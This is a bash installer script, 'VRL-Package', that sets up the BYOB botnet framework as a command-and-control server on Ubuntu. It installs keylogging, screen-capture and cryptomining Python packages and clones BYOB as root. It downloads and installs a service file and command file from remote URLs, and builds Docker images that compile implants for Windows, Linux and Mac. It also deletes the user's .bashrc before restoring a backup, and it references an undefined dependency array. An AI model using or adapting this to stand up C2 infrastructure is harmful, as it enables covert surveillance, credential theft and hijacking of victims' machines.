#!/usr/bin/env bash

######## VARIABLES
gitBranch="master"
vrlFilesDir="/usr/local/src/vrl-package"
vrlServiceFile="/etc/systemd/system/vrl.service"
vrlCommandFile="/usr/local/bin/vrl"
byobGitUrl="https://github.com/vrlnx/byob.git"
byobFileDir="${vrlFilesDir}/byob"

PY_VER="python3"
PIP_INSTALL="${PY_VER} -m pip install --no-warn-script-location"

# Dependencies that are required by the script
BASE_DEPS=(git tar wget grep net-tools bsdmainutils)

######## URL #######
commandfileUrl="https://github.com/jsegarradev/byob-package/-/raw/master/service/vrl"
serviceUrl="https://github.com/jsegarradev/byob-package/-/raw/master/service/vrl.service"

######## PKG Vars ########
PKG_MANAGER="apt"
PKG_CACHE="/var/lib/apt/lists/"
### FIXME: quoting UPDATE_PKG_CACHE and PKG_INSTALL hangs the script, shellcheck SC2086
UPDATE_PKG_CACHE="${PKG_MANAGER} update -qq"
PKG_INSTALL="${PKG_MANAGER} --yes --no-install-recommends install"
PKG_COUNT="${PKG_MANAGER} -s -o Debug::NoLocking=true upgrade | grep -c ^Inst || true"

# Override localization settings so the output is in English language.
export LC_ALL=C

main(){
    cleanUp
    clear
    rootCheck
    osCheck
    welcomeDialogs
    say "Initiating install..."
    sleep 1
    installDependentPackages BASE_DEPS[@]
    installDependentPackages REQU_DEPS[@]
    notifyPackageUpdatesAvailable
    byobSetup
    displayFinalMessage
}
rootCheck() {
    if [[ $EUID -eq 0 ]];then
        say "You are root!"
        say
        denyAccess
    else
        say "Verify your user."
        # Check if it is actually installed
        # If it isn't, exit because the install cannot complete
        if [[ $(dpkg-query -s sudo) ]];then
            export SUDO="sudo"
            export SUDOE="sudo -E"
            $SUDO echo "::: Verification Complete"
        else
            say "Please install sudo."
            exit 1
        fi
    fi
}
osCheck() {
    SUPPORTED_OS=(Ubuntu Pop)
    # if lsb_release command is on their system
    if command -v lsb_release > /dev/null; then

        PLAT=$(lsb_release -si)
        OSCN=$(lsb_release -sc)

    else # else get info from os-release

        # shellcheck disable=SC1091
        source /etc/os-release
        PLAT=$(awk '{print $1}' <<< "$NAME")
        VER="$VERSION_ID"
        declare -A VER_MAP=(["19.04"]="dingo" ["19.10"]="eoan" ["20.04"]="focal" ["20.10"]="groovy")
        OSCN=${VER_MAP["${VER}"]}
    fi
    
    case ${PLAT} in
        Ubuntu|Pop)
            case ${OSCN} in
                dingo|eoan|focal|groovy)
                :
                ;;
                *)
                maybeOSSupport
                ;;
            esac
        ;;
        *)
        noOSSupport
        ;;
    esac
}
noOSSupport(){
    say "Invalid OS detected"
    say "We have not been able to detect a supported OS."
    say "Currently this installer supports ${SUPPORTED_OS[@]}."
    say "For more details, check our documentation at https://github.com/jsegarradev/byob-package"
    exit 1
}
maybeOSSupport(){
    say "OS Not Supported"
    say "You are on an OS that we have not tested but MAY work, continuing anyway..."
}
notifyPackageUpdatesAvailable(){
    # Let user know if they have outdated packages on their system and
    # advise them to run a package update at soonest possible.
    say
    echo -n "::: Checking ${PKG_MANAGER} for upgraded packages...."
    updatesToInstall=$(eval "${PKG_COUNT}" &> /dev/null)
    echo " done!"
    say
    if [[ ${updatesToInstall} -eq "0" ]]; then
        say "Your system is up to date! Continuing with vrl-package installation..."
    else
        say "There are ${updatesToInstall} updates available for your system!"
        say "We recommend you update your OS after installing vrl-package! "
        say
    fi
}
welcomeDialogs(){
    clear
    say "VRL Installer - Automated"
    say "This installer will transform your ${PLAT} host into an C2 server!"
    say "By using this you agree to vrl-package's TOS and Rules of Conduct"
    say
    say "You have 10 sec to abort install if you do not agree [CTRL+C]"
    numsz=(5 4 3 2 1)
    for i in ${numsz[@]}; do
        sleep 1
        echo -en "\r\e[KLaunch in $i..."
    done
}
pipConfig(){
    local REQU_PIP=(
    flask
    flask_wtf
    flask_mail
    flask-bcrypt
    flask-login
    flask-sqlalchemy
    flask-session
    wtforms
    pyinstaller==3.6
    mss==3.3.0
    WMI==1.4.9
    numpy==1.19.3
    pyxhook==1.0.0
    twilio==6.14.0
    colorama
    requests==2.20.0
    pycryptodomex==3.8.1
    py-cryptonight
    opencv-python
    git+https://github.com/jtgrassie/pyrx.git#egg=pyrx
    )
    for i in ${REQU_PIP[@]}; do
        say "Installing $i..."
        $SUDO ${PIP_INSTALL} $i > /dev/null & spinner $!
    done
}
byobSetup(){
    managevrl(){
        say "Configuring .local mDNS"
        $SUDO systemctl start avahi-daemon &> /dev/null
        $SUDO systemctl enable avahi-daemon &> /dev/null
        say "Enabled avahi-daemon on Boot"

        say "Configuring Docker Container Service"
        $SUDO systemctl start docker &> /dev/null
        $SUDO systemctl enable docker &> /dev/null
        say "Enabled Docker on Boot"
        
        say "Installing general lacking requirements"
        cd ${vrlFilesDir}
        pipConfig > /dev/null & spinner $!
    }
    manageByob(){
        say "Setting up BYOB using vrl-package"
        cd ${vrlFilesDir}
        $SUDO git clone ${byobGitUrl} &> /dev/null
        sleep 1
        $SUDO chown root:root -R ${vrlFilesDir} &> /dev/null
        [ ! -d "${byobFileDir}" ] && say "[ ERROR ] LOC: ${byobFileDir} does not exsist. Failed to install!" && exit 1 || say "[ OK ] LOC: ${byobFileDir}"

        say "Downloading Byob Python3 CLI requirements"
        cd ${byobFileDir}/byob
        ${PIP_INSTALL} -r requirements.txt > /dev/null & spinner $!
        say "Applying Python3 CLI requirements"
        $SUDO ${PY_VER} ${byobFileDir}/byob/setup.py > /dev/null & spinner $!

        say "Downloading Byob Python3 GUI requirements"
        cd ${byobFileDir}/web-gui/
        $SUDO ${PIP_INSTALL} -r requirements.txt > /dev/null & spinner $!
        say "Configuring Byob service permissions"
        $SUDO chmod 755 ${byobFileDir}/web-gui/service.sh > /dev/null & spinner $!
    }
    [ ! -d "${vrlFilesDir}" ] && $SUDO mkdir ${vrlFilesDir} && say "[ OK ] - Creating vrl folder" || echo "WARNING - ${vrlFilesDir} already exist!" && say "Removing old folder" && $SUDO rm -rf ${vrlFilesDir} && $SUDO mkdir ${vrlFilesDir}
    buildDockerImages(){
        say "Building Docker images - this will take a while, please be patient..."
        say
        cd ${byobFileDir}/web-gui/docker-pyinstaller
        say "Building amd64 for Mac and Linux enviorment"
        docker build -f Dockerfile-py3-amd64 -t nix-amd64 . > /dev/null & spinner $!
        say "Building i386 for Mac and Linux enviorment"
        docker build -f Dockerfile-py3-i386 -t nix-i386 . > /dev/null & spinner $!
        say "Building x32 for Windows enviorment"
        docker build -f Dockerfile-py3-win32 -t win-x32 . > /dev/null & spinner $!
    }
    managevrl
    manageByob

    say "Source PATH"
    sleep 1
    PATH=$PATH:$HOME/.local/bin &> /dev/null
    say "Change owner of: ${vrlFilesDir}"
    sleep 1
    
    say "Configuring command services"
    $SUDO wget -O ${vrlCommandFile} ${commandfileUrl} &> /dev/null
    $SUDO chmod 755 ${vrlCommandFile}
    
    say "Configuring system services"
    $SUDO wget -O ${vrlServiceFile} ${serviceUrl} &> /dev/null
    $SUDO chmod 755 "${vrlServiceFile}"

    say "done."
    sleep 2

    buildDockerImages
    $SUDO rm -rf ~/byob ~/requirements.txt
    
}
installDependentPackages(){
	declare -a TO_INSTALL=()

	declare -a argArray1=("${!1}")

	for i in "${argArray1[@]}"; do
		echo -n ":::    Checking for $i..."
		if $SUDO dpkg-query -W -f='${Status}' "${i}" 2>/dev/null | grep -q "ok installed"; then
			echo " already installed!"
		else
			echo " not installed!"
			TO_INSTALL+=("${i}")
		fi
	done

    $SUDO ${PKG_INSTALL} "${TO_INSTALL[@]}" &> /dev/null

	local FAILED=0

	for i in "${TO_INSTALL[@]}"; do
		if $SUDO dpkg-query -W -f='${Status}' "${i}" 2>/dev/null | grep -q "ok installed"; then
			say "   Package $i successfully installed!"
			INSTALLED_PACKAGES+=("${i}")
		else
			say "   Failed to install $i!"
			((FAILED++))
		fi
	done

	if [ "$FAILED" -gt 0 ]; then
		exit 1
	fi
}
cleanUp(){
    say "Cleaning up auto start script"
    $SUDO rm -f $HOME/.bashrc
    sleep 1
    say "Allocating back to normal"
    mv $HOME/.bashrc.old $HOME/.bashrc
}
displayFinalMessage(){
    cd ~
    clear
    say
    say "Installation Complete!"
    say "Run 'vrl help' to see what else you can do!"
    say
    say "If you run into any issue, please read all our documentation carefully."
    say "All incomplete posts or bug reports will be ignored or deleted."
    say
    say "Thank you for using VRL-Package."
    say
}
spinner(){
	local pid=$1
	local delay=0.45
	local spinstr='/-\|'
	while ps a | awk '{print $1}' | grep -q "$pid"; do
		local temp=${spinstr#?}
		printf " [%c]  " "${spinstr}"
		local spinstr=${temp}${spinstr%"$temp"}
		sleep ${delay}
		printf "\\b\\b\\b\\b\\b\\b"
	done
	printf "    \\b\\b\\b\\b"
}
denyAccess() {
    say "::::::::::::::::::::::::::::: :::"
    say "  Looks like more reading     :::"        
    say "  is needed...                :::"
    say "                              :::"
    say "                              :::"
    say "      Access denied!          :::"
    say "::::::::::::::::::::::::::::: :::"
    exit 1
}
say() {
    echo "::: $@"
}
main "$@"